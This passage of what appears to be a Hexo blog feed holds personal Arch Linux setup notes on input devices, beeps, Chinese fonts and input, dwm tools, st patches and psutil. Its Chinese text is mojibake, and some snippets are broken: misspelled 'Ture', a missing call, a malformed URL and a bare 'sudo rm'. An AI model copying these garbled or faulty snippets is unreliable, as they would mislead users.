href="#æŸ¥çœ‹-device-çš„è®¾ç½®" class="headerlink" title="æŸ¥çœ‹ device çš„è®¾ç½®"></a>æŸ¥çœ‹ device çš„è®¾ç½®</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">xinput</span> <span class="hljs-built_in">list-props</span> <span class="hljs-string">device</span><br></code></pre></td></tr></table></figure><h2 id="ä¿®æ”¹æŸé¡¹è®¾ç½®"><a href="#ä¿®æ”¹æŸé¡¹è®¾ç½®" class="headerlink" title="ä¿®æ”¹æŸé¡¹è®¾ç½®"></a>ä¿®æ”¹æŸé¡¹è®¾ç½®</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig">$ <span class="hljs-string">xinput</span> <span class="hljs-built_in">set-prop</span> <span class="hljs-string">device</span> <span class="hljs-string">option</span> <span class="hljs-string">setting</span><br></code></pre></td></tr></table></figure><p><code>device</code> å’Œ <code>setting</code> éƒ½å¯ä»¥æ˜¯ç¼–å·.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³é—­ Archlinux å‘½ä»¤è¡Œèœ‚é¸£å£°</title>
    <link href="/2022/09/05/%E5%85%B3%E9%97%AD-Archlinux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%9C%82%E9%B8%A3%E5%A3%B0/"/>
    <url>/2022/09/05/%E5%85%B3%E9%97%AD-Archlinux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%9C%82%E9%B8%A3%E5%A3%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h1><p>ä¸»æ¿ä¸Šçš„èœ‚é¸£å™¨æ¨¡å—å¤„äºæ‰“å¼€çŠ¶æ€ï¼Œå…³é—­å³å¯.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>å…ˆæŸ¥çœ‹:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">sudo lsmod<span class="hljs-string">| grep pcspkr</span><br></code></pre></td></tr></table></figure><p>ç¼–è¾‘ <code>/etc/modprobe.d/nobeep.conf</code> æ–‡ä»¶ï¼Œè¾“å…¥ <code>blacklist pcspkr</code>ï¼Œç„¶åé‡å¯.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¿®å¤ fcitx æ— æ³•åœ¨ç»ˆç«¯ä¸‹ä½¿ç”¨ä¸­æ–‡</title>
    <link href="/2022/09/05/%E4%BF%AE%E5%A4%8D-fcitx-%E6%97%A0%E6%B3%95%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87/"/>
    <url>/2022/09/05/%E4%BF%AE%E5%A4%8D-fcitx-%E6%97%A0%E6%B3%95%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%B8%8B%E4%BD%BF%E7%94%A8%E4%B8%AD%E6%96%87/</url>
    
    <content type="html"><![CDATA[<p>åŸå› æ˜¯æˆ‘å…ˆæŠŠ ArchWiki ä¸Šé¢å»ºè®®çš„ä¸€äº›ç¯å¢ƒå˜é‡å†™åœ¨äº† <code>~.xinitrc</code> ä¸­ï¼Œå¯¼è‡´å…¶æ²¡æœ‰å…¶æ•ˆæœï¼Œè¦å†™åœ¨ <code>.pam_environment</code> è¿™ä¸ªæ–‡ä»¶ä¸­.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix the messy code of archlinux to display chinese</title>
    <link href="/2022/09/05/Fix-the-messy-code-of-archlinux-to-display-chinese/"/>
    <url>/2022/09/05/Fix-the-messy-code-of-archlinux-to-display-chinese/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Localization/Chinese">ArchWiki</a><br>Click the hyperlink above, you can chose a font to download.</p><h1 id="Reason"><a href="#Reason" class="headerlink" title="Reason"></a>Reason</h1><p>Why this happen.</p><p>When we locale our archlinux at the very beginning, we uncomment two line in file <code>/etc/locale.gen</code> and set the <code>LANG</code> variable by adding <code>LANG=en_US.UTF-8</code> to <code>/etc/locale.conf</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">sed -i <span class="hljs-string">&#x27;s/^#en_US.UTF-8/en_US.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>sed -i <span class="hljs-string">&#x27;s/^#zh_CN.UTF-8/zh_CN.UTF-8/&#x27;</span> <span class="hljs-regexp">/etc/</span>locale.gen<br>locale-gen<br>echo <span class="hljs-string">&quot;LANG=en_US.UTF-8&quot;</span> &gt;&gt; <span class="hljs-regexp">/etc/</span>locale.conf<br></code></pre></td></tr></table></figure><p>Thatâ€™s not enough.</p><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>One Chinese font needed to be download to display the Chinese in the right way:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S wqy-zenhei</span><br></code></pre></td></tr></table></figure><p>It will be fixxed</p><h1 id="Adding-Chinese-input-method-and-googlepinyin"><a href="#Adding-Chinese-input-method-and-googlepinyin" class="headerlink" title="Adding Chinese input method and googlepinyin"></a>Adding Chinese input method and googlepinyin</h1><p>Install the fcitx:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S fcitx fcitx-googlepinyin fcitx-configtool</span><br></code></pre></td></tr></table></figure><p>Adding some environment variable in <code>~/.xinitrc</code> and start the fcitx when you enter X:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">fcitx <span class="hljs-meta">&amp;</span><br></code></pre></td></tr></table></figure><p>Use <code>fcitx-configtool</code> to set googlepinyin:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>fcitx-configtool<br></code></pre></td></tr></table></figure><p>restart the X.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Screen Shot on Archlinux with dwm</title>
    <link href="/2022/09/04/Screen-Shot-on-Archlinux-with-dwm/"/>
    <url>/2022/09/04/Screen-Shot-on-Archlinux-with-dwm/</url>
    
    <content type="html"><![CDATA[<h1 id="scrot"><a href="#scrot" class="headerlink" title="scrot"></a>scrot</h1><p>install scrot:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S scrot</span><br></code></pre></td></tr></table></figure><h1 id="Use"><a href="#Use" class="headerlink" title="Use"></a>Use</h1><p>Input <code>scrot</code> on command line, and it will save the screen shot in the current file.</p><p>You can specify the window by <code>-s</code> option.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>To adjust the volume on archlinux</title>
    <link href="/2022/09/04/To-adjust-the-volume-on-archlinux/"/>
    <url>/2022/09/04/To-adjust-the-volume-on-archlinux/</url>
    
    <content type="html"><![CDATA[<p>You can not use <code>F2</code> or <code>Fn + F2</code> to adjust the volume, we also need to install a software:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S pulseaudio pulseaudio-alsa pulseaudio-equalizer alsa-utils pavucontrol playerctl</span><br></code></pre></td></tr></table></figure><p>I just install pulseaudio now.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Preview Picture and Change the background of dwm</title>
    <link href="/2022/09/04/Preview-Picture-and-Change-the-background-of-dwm/"/>
    <url>/2022/09/04/Preview-Picture-and-Change-the-background-of-dwm/</url>
    
    <content type="html"><![CDATA[<p>Two software should be installed.</p><h1 id="sxiv"><a href="#sxiv" class="headerlink" title="sxiv"></a>sxiv</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S sxiv</span><br></code></pre></td></tr></table></figure><p>Itâ€™s used to preview the picture.</p><p>You need to enter the picture directory first.</p><p>Grammer:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sxiv *    <br></code></pre></td></tr></table></figure><p>Then you can click mouse to change the picture.</p><h1 id="xwallpaper"><a href="#xwallpaper" class="headerlink" title="xwallpaper"></a>xwallpaper</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S xwallpaper</span><br></code></pre></td></tr></table></figure><p>Itâ€™s used to set the wallpaper.</p><p>If the path of the picture is <code>~/bgd/wall.png</code>, the grammer:</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">xwallpaper --zoom ~<span class="hljs-regexp">/bgd/</span>wall.png<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Beautify the st</title>
    <link href="/2022/09/04/Beautify-the-st/"/>
    <url>/2022/09/04/Beautify-the-st/</url>
    
    <content type="html"><![CDATA[<h1 id="Changing-the-font-size"><a href="#Changing-the-font-size" class="headerlink" title="Changing the font size"></a>Changing the font size</h1><p>Itâ€™s better to remove the <code>config.def.h</code> file.</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo <span class="hljs-built_in">rm</span> <br></code></pre></td></tr></table></figure><p>Edit the <code>config.h</code> file, changing the value of <code>pixelsize</code>.</p><p>Then reload the st:</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">$ sudo make clean <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><h1 id="æ”¹å˜ç»ˆç«¯çš„å­—ä½“"><a href="#æ”¹å˜ç»ˆç«¯çš„å­—ä½“" class="headerlink" title="æ”¹å˜ç»ˆç«¯çš„å­—ä½“"></a>æ”¹å˜ç»ˆç«¯çš„å­—ä½“</h1><p>ä¿®æ”¹ config.h ä¸­ <code>static char *font</code> è¿™ä¸ªå­—ç¬¦ä¸².</p><h1 id="The-way-to-patch"><a href="#The-way-to-patch" class="headerlink" title="The way to patch"></a>The way to patch</h1><p>Go to the official Web and get the patch by <code>wget</code> like:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ wget http:<span class="hljs-regexp">//</span>st.suckless.org<span class="hljs-regexp">/patches/</span>alpha/st-alpha-<span class="hljs-number">20220206</span>-<span class="hljs-number">0.8</span>.<span class="hljs-number">5</span>.diff<br></code></pre></td></tr></table></figure><p>Use <code>patch &lt;</code> to patch the <code>.diff</code> file:</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">$ patch &lt; <span class="hljs-keyword">st</span>-<span class="hljs-keyword">alpha</span>-20220206-0.8.5.diff<br></code></pre></td></tr></table></figure><h1 id="To-make-the-background-blur"><a href="#To-make-the-background-blur" class="headerlink" title="To make the background blur"></a>To make the background blur</h1><p>Patch the st-alpha-0.8.2.diff.</p><h1 id="To-change-the-color"><a href="#To-change-the-color" class="headerlink" title="To change the color"></a>To change the color</h1><p>Patch the st-dracula-0.8.5.diff</p><h1 id="Allow-you-to-scrollback"><a href="#Allow-you-to-scrollback" class="headerlink" title="Allow you to scrollback"></a>Allow you to scrollback</h1><p>Patch the st-scrollback-mouse-altscreen-20220127-2c5edf2.diff</p>]]></content>
    
    
    <categories>
      
      <category>Suckless</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/04/hello-world/"/>
    <url>/2022/09/04/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/09/04/psutil-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/04/psutil-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>import psutil</p><h1 id="è·å–å®Œæ•´ä¿¡æ¯"><a href="#è·å–å®Œæ•´ä¿¡æ¯" class="headerlink" title="è·å–å®Œæ•´ä¿¡æ¯"></a>è·å–å®Œæ•´ä¿¡æ¯</h1><p>print(psutil.cpu_times())</p><h1 id="è·å–-CPU-é€»è¾‘ä¸ªæ•°"><a href="#è·å–-CPU-é€»è¾‘ä¸ªæ•°" class="headerlink" title="è·å– CPU é€»è¾‘ä¸ªæ•°"></a>è·å– CPU é€»è¾‘ä¸ªæ•°</h1><p>print(psutil.cpu_count())</p><h1 id="è·å–-CPU-ç‰©ç†ä¸ªæ•°"><a href="#è·å–-CPU-ç‰©ç†ä¸ªæ•°" class="headerlink" title="è·å– CPU ç‰©ç†ä¸ªæ•°"></a>è·å– CPU ç‰©ç†ä¸ªæ•°</h1><p>print(psutil.cpu_count(logical&#x3D;False))</p><h1 id="è·å–-CPU-ä½¿ç”¨ç‡ï¼Œå…¶æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸º-interval-æŒ‡å®šè®¡ç®—-CPU-ä½¿ç”¨ç‡çš„æ—¶é—´é—´éš”"><a href="#è·å–-CPU-ä½¿ç”¨ç‡ï¼Œå…¶æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸º-interval-æŒ‡å®šè®¡ç®—-CPU-ä½¿ç”¨ç‡çš„æ—¶é—´é—´éš”" class="headerlink" title="è·å– CPU ä½¿ç”¨ç‡ï¼Œå…¶æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸º interval, æŒ‡å®šè®¡ç®— CPU ä½¿ç”¨ç‡çš„æ—¶é—´é—´éš”"></a>è·å– CPU ä½¿ç”¨ç‡ï¼Œå…¶æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œå‰è€…ä¸º interval, æŒ‡å®šè®¡ç®— CPU ä½¿ç”¨ç‡çš„æ—¶é—´é—´éš”</h1><h1 id="åè€…-percpu-æŒ‡å®šéœ€è¦æ€»çš„ä½¿ç”¨ç‡è¿˜æ˜¯æ¯ä¸ª-CPU-çš„ä½¿ç”¨ç‡"><a href="#åè€…-percpu-æŒ‡å®šéœ€è¦æ€»çš„ä½¿ç”¨ç‡è¿˜æ˜¯æ¯ä¸ª-CPU-çš„ä½¿ç”¨ç‡" class="headerlink" title="åè€… percpu æŒ‡å®šéœ€è¦æ€»çš„ä½¿ç”¨ç‡è¿˜æ˜¯æ¯ä¸ª CPU çš„ä½¿ç”¨ç‡"></a>åè€… percpu æŒ‡å®šéœ€è¦æ€»çš„ä½¿ç”¨ç‡è¿˜æ˜¯æ¯ä¸ª CPU çš„ä½¿ç”¨ç‡</h1><p>for _ in range(10):<br>    print(psutil.cpu_percent(interval&#x3D;1))<br>    print(psutil.cpu_percent(interval&#x3D;1, percpu&#x3D;Ture))</p><h1 id="è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ"><a href="#è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ"></a>è·å–å†…å­˜çš„ä½¿ç”¨æƒ…å†µ</h1><p>print(psutil.virtual_memory())</p><h1 id="è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯"><a href="#è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯" class="headerlink" title="è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯"></a>è·å–ç³»ç»Ÿäº¤æ¢å†…å­˜çš„ç»Ÿè®¡ä¿¡æ¯</h1><p>print(psutil.swap_memory())</p><h1 id="è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯"><a href="#è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯" class="headerlink" title="è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯"></a>è·å–ç£ç›˜åˆ†åŒºçš„ä¿¡æ¯</h1><p>print(psutil.disk_partitions)</p><h1 id="è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ"><a href="#è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ" class="headerlink" title="è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ"></a>è·å–ç£ç›˜çš„ä½¿ç”¨æƒ…å†µ</h1><p>print(psutil.disk_usage(â€˜&#x2F;â€˜))</p><h1 id="è·å–ç£ç›˜çš„-IO-ç»Ÿè®¡ä¿¡æ¯-è¯»å†™é€Ÿåº¦ç­‰"><a href="#è·å–ç£ç›˜çš„-IO-ç»Ÿè®¡ä¿¡æ¯-è¯»å†™é€Ÿåº¦ç­‰" class="headerlink" title="è·å–ç£ç›˜çš„ IO ç»Ÿè®¡ä¿¡æ¯(è¯»å†™é€Ÿåº¦ç­‰)"></a>è·å–ç£ç›˜çš„ IO ç»Ÿè®¡ä¿¡æ¯(è¯»å†™é€Ÿåº¦ç­‰)</h1><p>print(psutil.disk_io_counters())</p><h1 id="è·å–ç½‘ç»œä¿¡æ¯"><a href="#è·å–ç½‘ç»œä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œä¿¡æ¯"></a>è·å–ç½‘ç»œä¿¡æ¯</h1><h1 id="è·å–æ€»çš„ç½‘ç»œ-IO-ä¿¡æ¯"><a href="#è·å–æ€»çš„ç½‘ç»œ-IO-ä¿¡æ¯" class="headerlink" title="è·å–æ€»çš„ç½‘ç»œ IO ä¿¡æ¯"></a>è·å–æ€»çš„ç½‘ç»œ IO ä¿¡æ¯</h1><p>print(psutil.net_io_counters())</p><h1 id="è·å–ç½‘å¡çš„-IO-ä¿¡æ¯"><a href="#è·å–ç½‘å¡çš„-IO-ä¿¡æ¯" class="headerlink" title="è·å–ç½‘å¡çš„ IO ä¿¡æ¯"></a>è·å–ç½‘å¡çš„ IO ä¿¡æ¯</h1><p>print(psutil.net_io_counters(pernic&#x3D;Ture))</p><h1 id="è·å–ç½‘ç»œæ¥å£ä¿¡æ¯"><a href="#è·å–ç½‘ç»œæ¥å£ä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œæ¥å£ä¿¡æ¯"></a>è·å–ç½‘ç»œæ¥å£ä¿¡æ¯</h1><p>print(psutil.net_if_addrs())</p><h1 id="è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯"><a href="#è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯" class="headerlink" title="è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯"></a>è·å–ç½‘ç»œæ¥å£çŠ¶æ€ä¿¡æ¯</h1><p>print(psutil.net_if_stats())</p><h1 id="è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯"><a href="#è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯" class="headerlink" title="è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯"></a>è·å–å…¶ä»–ç³»ç»Ÿä¿¡æ¯</h1><h1 id="è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´"><a href="#è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´" class="headerlink" title="è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´,"></a>è·å–ç³»ç»Ÿå¼€æœºçš„æ—¶é—´,</h1><p>print(psutil.boot_time())</p><h1 id="è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨"><a href="#è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨"></a>è·å–è¿æ¥ç³»ç»Ÿçš„ç”¨æˆ·åˆ—è¡¨</h1><p>print(psutil.users())</p><h1 id="è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯"><a href="#è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯" class="headerlink" title="è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯"></a>è·å–ç³»ç»Ÿå…¨éƒ¨çš„è¿›ç¨‹ä¿¡æ¯</h1><p>print(psutil.pids())</p><h1 id="è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹-ID-x3D-100"><a href="#è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹-ID-x3D-100" class="headerlink" title="è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹ ID&#x3D;100"></a>è·å–å•ä¸ªè¿›ç¨‹çš„ä¿¡æ¯ï¼Œè·å–æŒ‡å®šè¿›ç¨‹ ID&#x3D;100</h1><p>print(psutil.Process(100))</p><h1 id="æ¨¡æ‹Ÿ-ps-å‘½ä»¤æ•ˆæœ"><a href="#æ¨¡æ‹Ÿ-ps-å‘½ä»¤æ•ˆæœ" class="headerlink" title="æ¨¡æ‹Ÿ ps å‘½ä»¤æ•ˆæœ"></a>æ¨¡æ‹Ÿ ps å‘½ä»¤æ•ˆæœ</h1><p>print(psutil.test())</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ xinit éƒ¨åˆ†</title>
    <link href="/2022/09/04/ArchWiki-%E4%B8%AD-xinit-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/04/ArchWiki-%E4%B8%AD-xinit-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org.title/Xinit">ArchWiki ä¸­ xinit éƒ¨åˆ†</a><br>xinit ç¨‹åºå…è®¸ç”¨æˆ·æ‰‹åŠ¨å¯åŠ¨ Xorg æ˜¾ç¤ºæœåŠ¡å™¨ã€‚</p><p>startx è„šæœ¬æ˜¯ xinit çš„ä¸€ä¸ªå‰ç«¯ã€‚</p><p>xinit é€šå¸¸ç”¨äºå¯åŠ¨çª—å£ç®¡ç†å™¨æˆ–æ¡Œé¢ç¯å¢ƒ.</p><h1 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h1><p>xinit å’Œ startx éœ€è¦ä¸€ä¸ªå¯é€‰çš„å®¢æˆ·ç«¯ç¨‹åºå‚æ•°ï¼Œå¦‚æœæ²¡æœ‰æä¾›å‚æ•°ï¼Œå®ƒä»¬ä¼š2å¯»æ‰¾ <code>~/.xinitrc</code> ä½œä¸ºä¸€ä¸ª shell è„šæœ¬è¿è¡Œã€‚</p><h2 id="xinitrc"><a href="#xinitrc" class="headerlink" title="xinitrc"></a>xinitrc</h2><p><code>~/.xinitrc</code> å¦‚æœå­˜åœ¨äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸­ï¼Œstartx å’Œ xinit ä¼šæ‰§è¡Œå®ƒ, å¦åˆ™ï¼Œstartx å°†è¿è¡Œé»˜è®¤çš„ <code>/etc/X11/xinit/xinitrc</code>.</p><p>è¿™ä¸ªé»˜è®¤çš„ xinitrc å°†å¯åŠ¨ä¸€ä¸ªåŒ…å« Twm, xorg-xclock å’Œ Xterm çš„åŸºæœ¬ç¯å¢ƒï¼Œè¦å¯åŠ¨ä¸åŒçš„çª—å£ç®¡ç†å™¨æˆ–æ¡Œé¢ç¯å¢ƒï¼Œé¦–å…ˆè¦åœ¨ä¸»ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªé»˜è®¤çš„ <code>xinitrc</code> å‰¯æœ¬.</p><p>æ³¨æ„ <code>exec</code> åé¢çš„è¡Œå°†ä¼šè¢«å¿½ç•¥ï¼Œå› æ­¤å…¶ä»–çš„ä¸œè¥¿åº”è¯¥æ”¾åœ¨ <code>exec</code> è¿™è¡Œå‘½ä»¤ä¹‹å‰.</p><p>åœ¨çª—å£ç®¡ç†å™¨ä¹‹å‰å¯åŠ¨çš„é•¿æœŸè¿è¡Œçš„ç¨‹åºï¼Œå¦‚å±ä¿å’Œå¢™çº¸ç¨‹åºï¼Œå¿…é¡»ä½¿ç”¨ <code>&amp;</code> æ”¾å…¥åå°è¿è¡Œï¼Œå¦åˆ™ï¼Œåœ¨æ‰§è¡Œçª—å£ç®¡ç†å™¨æˆ–æ¡Œé¢ç¯å¢ƒä¹‹å‰ï¼Œè„šæœ¬ä¼šåœæ­¢è¿è¡Œå¹¶ç­‰å¾…æ¯ä¸ªç¨‹åºé€€å‡º.</p><h2 id="ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨-X"><a href="#ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨-X" class="headerlink" title="ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ X"></a>ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨ X</h2><p>åœ¨ login shell åˆå§‹åŒ–æ–‡ä»¶ï¼Œå¦‚ Bash çš„ <code>~/.bash_profile</code> æˆ– Zsh çš„ <code>~/.zprofile</code> ä¸­æ”¾ç½®:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;DISPLAY&#125;</span>&quot;</span> ] &amp;&amp; [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XDG_VTNR&#125;</span>&quot;</span> -eq 1 ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">exec</span> startx<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="åœ¨æ²¡æœ‰çª—å£ç®¡ç†å™¨çš„æƒ…å†µä¸‹å¯åŠ¨åº”ç”¨ç¨‹åº"><a href="#åœ¨æ²¡æœ‰çª—å£ç®¡ç†å™¨çš„æƒ…å†µä¸‹å¯åŠ¨åº”ç”¨ç¨‹åº" class="headerlink" title="åœ¨æ²¡æœ‰çª—å£ç®¡ç†å™¨çš„æƒ…å†µä¸‹å¯åŠ¨åº”ç”¨ç¨‹åº"></a>åœ¨æ²¡æœ‰çª—å£ç®¡ç†å™¨çš„æƒ…å†µä¸‹å¯åŠ¨åº”ç”¨ç¨‹åº</h2><p>å¦‚:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 